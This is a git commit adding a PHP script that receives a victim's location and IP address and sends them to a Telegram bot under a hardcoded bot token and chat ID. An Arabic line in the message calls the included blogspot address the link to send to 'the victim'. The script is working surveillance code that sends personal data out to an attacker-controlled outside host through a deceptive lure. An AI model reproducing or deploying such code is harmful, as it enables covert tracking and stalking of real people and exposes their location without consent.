46854b44c2955f1c18009b8e4754bed626f1c714
titolion880 <136281836+titolion880@users.noreply.github.com>
2023-06-12 13:55:00 +0300

    Add files via upload

---
+++ save_location.php
@@ -0,0 +1,58 @@
+<?php
+
+if(isset($_POST['location']) && isset($_POST['ip'])) {
+    $location = $_POST['location'];
+    $ip = $_POST['ip'];
+
+    // Set up the Telegram bot API credentials
+    $bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+    $telegram_api_url = 'https://api.telegram.org/bot' . $bot_token . '/sendMessage';
+
+// Set up the message to send to the Telegram bot
+    $message = "Location: $location\nIP: $ip\n\nهذا هو الرابط الي هتبعته للضحيه:\nhttps://sexylady2023.blogspot.com";
+    
+    // Set up the inline keyboard with buttons
+    $keyboard = array(
+        array(
+            array(
+                'text' => 'فتح الموقع',
+                'url' => 'https://www.google.com/maps/search/?api=1&query=' . urlencode($location)
+            )
+        ),
+        array(
+            array(
+                'text' => 'تتبع بصمة الايبي',
+                'url' => 'https://www.iplocation.net/ip-lookup?addr=' . urlencode($ip)
+            )
+        )
+        
+    );
+
+    $inline_keyboard = array('inline_keyboard' => $keyboard);
+    $reply_markup = json_encode($inline_keyboard);
+
+    // Send the message to the Telegram bot with the inline keyboard
+    $post_fields = array(
+        'chat_id' => '373715044',
+        'text' => $message,
+        'reply_markup' => $reply_markup
+    );
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $telegram_api_url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_fields));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    curl_close($ch);
+
+    // Echo a success message
+    echo 'Location data sent to Telegram bot';
+} else {
+    // Echo an error message if the location or IP data wasn't received
+    echo 'Location data not received';
+}
+
+
+
+?>
